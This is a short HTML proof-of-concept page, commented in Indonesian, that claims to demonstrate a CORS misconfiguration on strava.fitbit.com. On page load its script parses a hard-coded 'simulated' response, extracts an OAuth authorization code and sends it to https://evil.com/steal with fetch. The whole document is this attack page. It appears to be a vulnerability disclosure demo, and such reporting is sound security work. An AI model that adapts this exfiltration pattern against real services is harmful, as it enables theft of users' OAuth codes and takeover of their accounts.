<!DOCTYPE html>
<html>
<head>
  <title>PoC – Fitbit CORS Misconfig</title>
</head>
<body>
  <h2>Ambil kode OAuth dari strava.fitbit.com</h2>
  <pre id="output">Memuat...</pre>

  <script>
    // Ini bukan benar2 fetch, hanya simulasi berdasarkan response asli
    const simulateExploit = async () => {
      const simulatedResponse = `
        {"newRedirectURL": "https%3A%2F%2Fwww.fitbit.com%2Foauth2%2Fauthorize%3Fcode%3DABC123XYZ"}
      `;

      const data = JSON.parse(simulatedResponse);
      const redirectUrl = decodeURIComponent(data.newRedirectURL);

      // Ekstrak kode OAuth
      const url = new URL(redirectUrl);
      const code = url.searchParams.get("code");

      document.getElementById("output").textContent = `✅ Kode berhasil diambil: ${code}`;

      // Kirim ke server attacker
      fetch("https://evil.com/steal?code=" + encodeURIComponent(code))
        .then(() => console.log("Kode dikirim ke attacker"))
        .catch(() => console.warn("Simulasi kirim gagal (karena evil.com bukan server kita)"));
    };

    simulateExploit();
  </script>
</body>
</html>

